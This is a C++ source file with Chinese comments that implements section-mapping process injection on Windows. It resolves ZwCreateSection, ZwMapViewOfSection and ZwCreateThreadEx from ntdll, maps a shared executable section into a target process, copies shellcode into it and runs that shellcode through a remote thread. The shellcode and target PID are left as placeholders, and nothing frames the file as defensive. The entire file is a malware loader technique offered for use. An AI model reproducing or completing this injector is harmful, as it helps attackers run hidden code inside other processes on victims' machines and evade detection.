#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* myZwCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* myZwMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI* myZwCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID);

int main() {
    HANDLE sectionHandle;
    LARGE_INTEGER sectionSize = { 4096 };
    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

    myZwCreateSection fZwCreateSection = (myZwCreateSection)GetProcAddress(GetModuleHandleA("ntdll"), "ZwCreateSection");
    myZwMapViewOfSection fZwMapViewOfSection = (myZwMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "ZwMapViewOfSection");
    myZwCreateThreadEx fZwCreateThreadEx = (myZwCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll"), "ZwCreateThreadEx");

    // 创建内存段
    fZwCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    // 在本地进程中映射内存段
    fZwMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &sectionSize, 2, NULL, PAGE_READWRITE);
    // 在目标进程中映射内存段
    HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 目标进程PID);
    fZwMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &sectionSize, 2, NULL, PAGE_EXECUTE_READ);
    // 将shellcode写入本地内存段
    unsigned char shellcode[] = "..."; // 你的shellcode
    memcpy(localSectionAddress, shellcode, sizeof(shellcode));
    // 创建远程线程执行shellcode
    HANDLE targetThreadHandle = NULL;
    fZwCreateThreadEx(&targetThreadHandle, GENERIC_EXECUTE, NULL, targetHandle, remoteSectionAddress, NULL, FALSE, 0, 0, 0, NULL);

    return 0;
}
